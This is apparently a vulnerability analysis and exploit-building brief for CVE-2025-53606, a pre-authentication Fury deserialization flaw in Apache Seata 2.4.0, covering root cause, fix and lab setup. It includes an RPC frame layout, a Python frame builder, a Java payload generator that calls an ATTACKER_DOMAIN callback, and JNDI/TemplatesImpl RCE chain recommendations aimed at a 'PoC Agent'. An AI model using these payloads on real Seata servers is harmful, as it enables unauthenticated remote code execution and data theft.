# Vulnerability Analysis: CVE-2025-53606

## Executive Summary

Apache Seata (incubating) v2.4.0 contains a critical deserialization vulnerability (CVSS 9.8) in the Fury serializer component. The `FurySerializerFactory` implements a class whitelist checker using a lambda that returns a boolean value, but Apache Fury's `ClassResolver.loadClass()` **ignores the boolean return value** of `ClassChecker.checkClass()` — it only stops deserialization if the checker **throws an exception**. Since the lambda never throws, ALL classes pass validation regardless of whitelist membership, enabling remote unauthenticated attackers to deserialize arbitrary Java classes via the Seata RPC protocol (TCP port 8091).

---

## Root Cause

### Technical Description

The vulnerability is in `FurySerializerFactory.java` at line 42. The Fury serializer is configured with `requireClassRegistration(false)`, which allows any class to be deserialized. A custom `ClassChecker` lambda is set to enforce a whitelist, but it has a fatal flaw:

```java
f.getClassResolver().setClassChecker(
    (classResolver, className) ->
        SerializerSecurityRegistry.getAllowClassPattern().contains(className)
);
```

**The ClassChecker contract**: Although the `ClassChecker` interface declares a `boolean checkClass()` return type, Fury's `ClassResolver.loadClass()` method calls the checker as a **void statement** — it discards the return value entirely:

```java
// Fury ClassResolver.loadClass() — line from fury-core 0.8.0
private Class<?> loadClass(String className, ...) {
    extRegistry.classChecker.checkClass(this, className);  // return value IGNORED
    try {
        return Class.forName(className, false, fury.getClassLoader());
    } catch (ClassNotFoundException e) { ... }
}
```

The **only** mechanism to block a class is to **throw an exception** (specifically `InsecureException`). The lambda returns `false` for non-whitelisted classes but never throws — so Fury proceeds to load and deserialize the class unconditionally.

### Secondary Flaw: Wildcard Pattern Matching

Even if the return value were checked, the whitelist contains `"org.apache.seata.*"` (a glob wildcard pattern), but `Set.contains()` performs exact string matching — it does not support wildcard/glob matching. This means the pattern `"org.apache.seata.*"` would only match the literal string `"org.apache.seata.*"`, not actual Seata class names like `"org.apache.seata.core.protocol.RegisterTMRequest"`.

### Third Flaw: Deny List Not Used

The `SerializerSecurityRegistry` maintains a deny list (`getDenyClassPattern()`) containing dangerous classes:
- `javax.naming.InitialContext`
- `javax.net.ssl.*`
- `com.unboundid.ldap.*`
- `java.lang.Runtime`

The Fury serializer **never checks the deny list**. Other serializers (Hessian) properly use both allow and deny lists.

---

## Vulnerable File(s) and Function(s)

### Primary Vulnerable Code

**File**: `serializer/seata-serializer-fury/src/main/java/org/apache/seata/serializer/fury/FurySerializerFactory.java`
**Lines**: 29-44 (entire Fury builder and checker configuration)
**Key vulnerable line**: Line 42 — the lambda-based ClassChecker

```java
// Line 29-44 — Vulnerable code
private static final ThreadSafeFury FURY = new ThreadLocalFury(classLoader -> {
    Fury f = Fury.builder()
            .withLanguage(Language.JAVA)
            .requireClassRegistration(false)   // Line 34: Allows ANY class
            .withRefTracking(true)
            .withClassLoader(classLoader)
            .withCompatibleMode(CompatibleMode.COMPATIBLE)
            .build();

    // Line 42: Broken checker — returns boolean but Fury ignores the return value
    f.getClassResolver().setClassChecker(
        (classResolver, className) ->
            SerializerSecurityRegistry.getAllowClassPattern().contains(className)
    );
    return f;
});
```

### Deserialization Entry Point

**File**: `serializer/seata-serializer-fury/src/main/java/org/apache/seata/serializer/fury/FurySerializer.java`
**Lines**: 36-42 — `deserialize(byte[] bytes)` method

```java
@Override
public <T> T deserialize(byte[] bytes) {
    if (bytes == null || bytes.length == 0) {
        throw new IllegalArgumentException("bytes is null");
    }
    ThreadSafeFury threadSafeFury = FurySerializerFactory.getInstance().get();
    return (T) threadSafeFury.deserialize(bytes);  // Arbitrary deserialization happens here
}
```

### Network Entry Point (Protocol Decoder)

**File**: `core/src/main/java/org/apache/seata/core/rpc/netty/v1/ProtocolDecoderV1.java`
**Lines**: 123-137 — `decodeFrame(ByteBuf frame)` body deserialization section

```java
int bodyLength = fullLength - headLength;
if (bodyLength > 0) {
    byte[] bs = new byte[bodyLength];
    frame.readBytes(bs);
    Compressor compressor = CompressorFactory.getCompressor(compressorType);
    bs = compressor.decompress(bs);
    SerializerType protocolType = SerializerType.getByCode(rpcMessage.getCodec());
    if (this.supportDeSerializerTypes.contains(protocolType)) {
        Serializer serializer = SerializerServiceLoader.load(protocolType, ProtocolConstants.VERSION_1);
        rpcMessage.setBody(serializer.deserialize(bs));  // <-- Vulnerable deserialization
    }
}
```

---

## Triggering Input

### Wire Protocol Format

The attacker sends a raw TCP message to port 8091 with the Seata RPC v1 binary protocol:

```
Offset  Size  Field               Value
------  ----  ------------------  ----------------------------------------
0-1     2B    Magic Code          0xDA 0xDA
2       1B    Protocol Version    0x01
3-6     4B    Full Length         (int32 BE) = 16 + bodyLength
7-8     2B    Head Length         0x00 0x10 (16, no head-map)
9       1B    Message Type        0x00 (SYNC_REQUEST)
10      1B    Codec Type          0x56 (FURY — 0x256 truncated to byte)
11      1B    Compressor          0x00 (NONE)
12-15   4B    Request ID          0x00 0x00 0x00 0x01 (any value)
16+     NB    Body                Fury-serialized malicious payload
```

**Critical detail**: The codec type byte `0x56` selects the FURY serializer. This value comes from `SerializerType.FURY((byte) 0x256)` — Java truncates `0x256` (598 decimal) to byte `0x56` (86 decimal).

### Payload Body

The body is a Fury-serialized Java object containing an arbitrary (non-whitelisted) class. The Fury binary format starts with a 1-byte header (0x00 for non-null Java-native object), followed by type metadata and field values.

**Recommended payload for DNS callback proof**: A `HashMap<java.net.URL, String>` where the URL points to an attacker-controlled domain. During Fury deserialization of the HashMap, `map.put(key, value)` is called, which triggers `URL.hashCode()` → `InetAddress.getByName(host)` → DNS lookup to attacker domain.

**Recommended payload for RCE**: On JDK 8 (confirmed in docker image: `openjdk 1.8.0_422`), JNDI injection via RMI/LDAP can load remote classes. A chain that triggers a JNDI lookup during deserialization (e.g., via HashMap key hashCode() chain) can achieve full RCE.

---

## Attack Scenario

### Step-by-Step Exploitation

1. **Reconnaissance**: Attacker identifies a Seata server instance with TCP port 8091 open (Netty RPC port).

2. **Payload Generation**: Attacker uses the Apache Fury 0.8.0 Java library to serialize a malicious object:
   ```java
   Fury fury = Fury.builder()
       .withLanguage(Language.JAVA)
       .requireClassRegistration(false)
       .withRefTracking(true)
       .withCompatibleMode(CompatibleMode.COMPATIBLE)
       .build();
   byte[] payload = fury.serialize(maliciousObject);
   ```

3. **Protocol Framing**: Attacker wraps the Fury-serialized payload in a Seata RPC v1 binary frame with codec byte `0x56` (FURY).

4. **Delivery**: Attacker sends the framed message to TCP port 8091.

5. **Server Processing**:
   - `ProtocolDecoderV1.decodeFrame()` reads the frame header
   - Identifies codec type as FURY (0x56)
   - Loads `FurySerializer` via `SerializerServiceLoader`
   - Calls `FurySerializer.deserialize(bodyBytes)`
   - `FurySerializerFactory`'s Fury instance processes the payload
   - For each class in the payload, `ClassResolver.loadClass()` calls the checker lambda
   - Lambda returns `false` for non-whitelisted classes but **does not throw**
   - Fury proceeds to instantiate the class and set its fields
   - **Arbitrary class deserialization succeeds**

6. **Impact**: Depending on the gadget chain:
   - **DNS callback**: Proves arbitrary deserialization (URL.hashCode())
   - **JNDI RCE** (JDK 8): Full remote code execution via LDAP/RMI class loading
   - **DoS**: Resource exhaustion via expensive object construction

---

## Impact

- **Confidentiality**: HIGH — Attacker can execute arbitrary code and read any data accessible to the Seata server process
- **Integrity**: HIGH — Attacker can modify data, inject transactions, corrupt undo logs
- **Availability**: HIGH — Attacker can crash the server or cause persistent DoS
- **Attack Vector**: Network (remote, no physical access needed)
- **Attack Complexity**: Low (single TCP message, no race conditions)
- **Privileges Required**: None (pre-authentication)
- **User Interaction**: None

### Escalation Path

The deserialization primitive enables arbitrary class instantiation and field setting. On JDK 8 (the default Docker image runtime), this can be escalated to full RCE via:

1. **JNDI Injection → Remote Class Loading**: Deserialize an object chain that triggers a JNDI lookup to an attacker-controlled LDAP/RMI server. On JDK 8 (no `com.sun.jndi.ldap.object.trustURLCodebase` restriction by default), the LDAP server can return a Reference pointing to a remote codebase, causing the JVM to download and instantiate an attacker-controlled class.

2. **HashMap-based trigger**: Fury's map deserialization calls `map.put(key, value)` for each entry, triggering `hashCode()` on keys. This is the activation mechanism for the gadget chain.

3. **Available gadget libraries on server classpath** (from `apache/seata-server:2.4.0`):
   - `fury-core-0.8.0.jar` (target serializer)
   - `spring-expression-5.3.39.jar` (SpEL evaluation)
   - `spring-context-5.3.39.jar`, `spring-beans-5.3.39.jar` (Spring framework)
   - `xstream-1.4.21.jar` (XML-based deserialization)
   - `snakeyaml-2.0.jar` (YAML parsing)
   - `jackson-databind-2.13.5.jar` (JSON binding)
   - `guava-32.1.3-jre.jar` (Google collections)
   - JDK 8 internal classes (`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`, etc.)

---

## Authentication Requirements

**No authentication is required.** The vulnerability is pre-authentication:

- The Seata RPC port (TCP 8091) accepts connections from any client
- The protocol decoder deserializes the message body **before** any authentication or authorization check
- The serializer type is selected per-message by the client (attacker-controlled) via the codec byte in the protocol header
- FURY is enabled by default in the `DEFAULT_SERIALIZER_TYPE` array in `SerializerServiceLoader`
- No TLS, API keys, tokens, or login credentials are needed

---

## Fix Assessment

### What the Fix Does

The fix (commit `d2a18aef82c08535e4134642070c39d98654f0f6`) replaces the broken lambda-based ClassChecker with Fury's built-in `AllowListChecker`:

```java
// BEFORE (vulnerable):
f.getClassResolver().setClassChecker(
    (classResolver, className) ->
        SerializerSecurityRegistry.getAllowClassPattern().contains(className)
);

// AFTER (fixed):
AllowListChecker checker = new AllowListChecker(AllowListChecker.CheckLevel.STRICT);
f.getClassResolver().setClassChecker(checker);
checker.allowClasses(SerializerSecurityRegistry.getAllowClassPattern());
```

### Fix Quality

The fix for `FurySerializerFactory` is **correct and effective** for its scope:

1. **`AllowListChecker` with `STRICT` mode**: Properly **throws `InsecureException`** for non-whitelisted classes, which is the mechanism Fury actually respects.
2. **`allowClasses()` method**: Correctly handles wildcard patterns like `"org.apache.seata.*"` (supports prefix matching with `*` suffix).
3. **Uses Fury's official security API**: This is the intended way to secure Fury deserialization.

### Remaining Attack Surface

The fix only covers `FurySerializerFactory.java` (RPC serializer). There is a **remaining attack surface** in a second Fury usage:

**File**: `rm-datasource/src/main/java/org/apache/seata/rm/datasource/undo/parser/FuryUndoLogParser.java` (lines 33-42)

```java
private static final ThreadSafeFury FURY = new ThreadLocalFury(classLoader -> Fury.builder()
        .withLanguage(Language.JAVA)
        .requireClassRegistration(false)   // <-- SAME dangerous setting
        .withRefTracking(true)
        .withClassLoader(classLoader)
        .withCompatibleMode(CompatibleMode.COMPATIBLE)
        .build());  // <-- NO ClassChecker set AT ALL
```

This has `requireClassRegistration(false)` with **no class checker whatsoever** — even worse than the original FurySerializerFactory. However, this is a **client-side component** used for undo log parsing from database storage, not directly exposed via the network RPC protocol. Exploitation would require database access or a separate SQL injection.

The fix commit does NOT address `FuryUndoLogParser`. This is a remaining attack surface but with a significantly different threat model (requires database write access rather than network-only).

### Fix Bypass Assessment

For the primary RPC attack vector (FurySerializerFactory): **No bypass identified.** The `AllowListChecker` with STRICT mode is Fury's official security mechanism. It:
- Properly throws exceptions for non-whitelisted classes
- Supports wildcard pattern matching
- Is thread-safe (uses ReadWriteLock)
- Is hardened against edge cases in Fury's own codebase

---

## Related Attack Surface

### 1. FuryUndoLogParser (Client-Side — No Class Checker)

**File**: `rm-datasource/src/main/java/org/apache/seata/rm/datasource/undo/parser/FuryUndoLogParser.java`
**Lines**: 33-42

Uses `requireClassRegistration(false)` with NO `ClassChecker` at all. Deserializes undo log data from database storage. Not fixed in the CVE patch. Requires database write access to exploit.

### 2. Other Serializers (Comparison — All Properly Secured)

| Serializer | Security Mechanism | Whitelist Enforcement | Status |
|---|---|---|---|
| **Kryo** | `setRegistrationRequired(true)` + explicit class registration | Throws on unregistered class | SECURE |
| **Hessian** | `setWhitelist(true)` + allow/deny patterns | Rejects unlisted classes | SECURE |
| **Fastjson2** | `autoTypeFilter` with allowed class array | Strict type checking | SECURE |
| **Seata (native)** | Custom codecs per message type | No reflection-based deser | SECURE |
| **Protobuf** | Schema-based (proto definitions) | No arbitrary class loading | SECURE |
| **Fury** | Broken lambda ClassChecker | **INEFFECTIVE** | **VULNERABLE** |

### 3. Serializer Selection is Attacker-Controlled

The attacker can force FURY serialization regardless of server configuration by setting codec byte `0x56` in the RPC header. The server's `DEFAULT_SERIALIZER_TYPE` array includes FURY:

**File**: `core/src/main/java/org/apache/seata/core/serializer/SerializerServiceLoader.java` (line 51)
```java
private static final SerializerType[] DEFAULT_SERIALIZER_TYPE =
    new SerializerType[]{SEATA, PROTOBUF, KRYO, HESSIAN, FASTJSON2, FURY};
```

All six serializer types are accepted by default. The attacker does not need to wait for a FURY-configured server — they can select FURY for any Seata server that ships the fury-serializer module (which is included in the default server distribution).

---

## Build System

### Build System Details

| Field | Value |
|---|---|
| **Build System** | Apache Maven (multi-module) |
| **Language** | Java 8 (JDK 1.8) |
| **Root POM** | `pom.xml` (revision property: 2.4.0) |
| **Build POM** | `build/pom.xml` |
| **Dependencies POM** | `dependencies/pom.xml` |
| **Vulnerable Module** | `serializer/seata-serializer-fury` |

### Build Commands

The PoC does NOT require building Seata from source. Use the pre-built Docker image:

```bash
docker pull apache/seata-server:2.4.0
docker run -d --name seata-vuln -p 8091:8091 -p 7091:7091 apache/seata-server:2.4.0
```

For building a payload generator (Java), a minimal Maven project with:
```xml
<dependency>
    <groupId>org.apache.fury</groupId>
    <artifactId>fury-core</artifactId>
    <version>0.8.0</version>
</dependency>
```

Or for a standalone Python PoC, the payload bytes can be pre-generated using a Java helper and then sent via raw TCP socket.

### Dependencies

**Server (Docker image — no build needed)**:
- `apache/seata-server:2.4.0` Docker image
- Base: `eclipse-temurin:8u422-b05-jdk` (JDK 8)
- All dependencies bundled in `/seata-server/libs/`

**Payload Generator (minimal Java project)**:
- JDK 8+ (`javac`, `java`)
- `fury-core-0.8.0.jar` (from Maven Central)
- No other dependencies needed for basic payload generation

### Runtime Requirements

| Requirement | Details |
|---|---|
| **Docker** | Docker engine for running vulnerable server |
| **Network** | TCP access to port 8091 (Seata RPC) |
| **Server Config** | Default — no custom config needed |
| **Authentication** | None required |
| **JDK for payload gen** | JDK 8+ (to use Fury library) |
| **Startup time** | ~5-10 seconds for Seata server to be ready |
| **Health check** | HTTP GET http://localhost:7091/health returns 200 |

### Docker Lab Setup

```yaml
# docker-compose.yml
version: '3.8'
services:
  seata-server:
    image: apache/seata-server:2.4.0
    ports:
      - "8091:8091"   # RPC port (vulnerable)
      - "7091:7091"   # Management/HTTP port
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:7091/health"]
      interval: 5s
      timeout: 3s
      retries: 10
```

---

## PoC Construction Guidance

### Recommended Approach

The most practical PoC approach is a **two-stage design**:

**Stage 1: Java Payload Generator**
Write a small Java program that uses `fury-core-0.8.0.jar` to serialize a malicious object and output the raw bytes. This avoids having to reverse-engineer Fury's binary format.

```java
// PayloadGenerator.java (conceptual)
Fury fury = Fury.builder()
    .withLanguage(Language.JAVA)
    .requireClassRegistration(false)
    .withRefTracking(true)
    .withCompatibleMode(CompatibleMode.COMPATIBLE)
    .build();

// Option A: DNS callback proof (reliable, no external infra needed for detection)
HashMap<URL, String> map = new HashMap<>();
URL url = new URL("http://ATTACKER_DOMAIN/proof");
// Set URL.hashCode to -1 to force recalculation on deserialization
Field hashCodeField = URL.class.getDeclaredField("hashCode");
hashCodeField.setAccessible(true);
hashCodeField.set(url, -1);
map.put(url, "test");

byte[] payload = fury.serialize(map);
// Write payload to stdout or file
```

**Stage 2: Python PoC Script**
Reads the pre-generated Fury payload bytes and wraps them in the Seata RPC v1 protocol frame, then sends via raw TCP socket.

```python
import socket, struct

MAGIC = b'\xda\xda'
VERSION = b'\x01'
HEAD_LENGTH = 16
MSG_TYPE_SYNC_REQUEST = 0x00
CODEC_FURY = 0x56
COMPRESSOR_NONE = 0x00
REQUEST_ID = 1

def build_seata_frame(fury_payload):
    full_length = HEAD_LENGTH + len(fury_payload)
    header = MAGIC + VERSION
    header += struct.pack('>i', full_length)     # Full length (BE int32)
    header += struct.pack('>h', HEAD_LENGTH)     # Head length (BE int16)
    header += struct.pack('B', MSG_TYPE_SYNC_REQUEST)
    header += struct.pack('B', CODEC_FURY)
    header += struct.pack('B', COMPRESSOR_NONE)
    header += struct.pack('>i', REQUEST_ID)
    return header + fury_payload
```

### Alternative: All-Java PoC

A single Java program can do everything:
1. Generate Fury payload with gadget chain
2. Construct Seata RPC frame
3. Send over TCP socket
4. Check for success indicators

This may be simpler since Fury payload generation requires the Fury library (Java).

### Gadget Chain Recommendations (Priority Order)

1. **HashMap + URL DNS callback** (simplest, most reliable proof):
   - Proves arbitrary deserialization
   - No external infrastructure needed for DNS detection (use `dig` or Collaborator)
   - Works on any JDK version

2. **JNDI injection via HashMap gadget** (RCE on JDK 8):
   - JDK 8 allows remote class loading via LDAP/RMI by default
   - Requires external LDAP/RMI server (e.g., marshalsec)
   - Full RCE

3. **TemplatesImpl-based chain** (RCE, classpath-dependent):
   - Requires a trigger mechanism (something that calls `newTransformer()` or `getOutputProperties()`)
   - Available in JDK 8 classpath
   - More complex but no external infrastructure needed

### Key Technical Notes for PoC Agent

- **Fury codec byte**: `0x56` (NOT `0x01` or any other value)
- **No compression**: Use compressor `0x00` (NONE) to keep it simple
- **No head map**: Set head length to `16` (base header, no extra map)
- **Message type**: `0x00` (SYNC_REQUEST) — server will attempt to process and respond
- **JDK version**: Server runs JDK 8u422 (Temurin) — JNDI remote class loading works
- **Fury config must match**: The payload generator MUST use the same Fury configuration as the server (Language.JAVA, refTracking=true, COMPATIBLE mode)
- **Server health check**: Wait for `curl http://localhost:7091/health` to return 200 before sending payload
- **Server logs**: Check `docker logs seata-vuln` for deserialization errors/exceptions
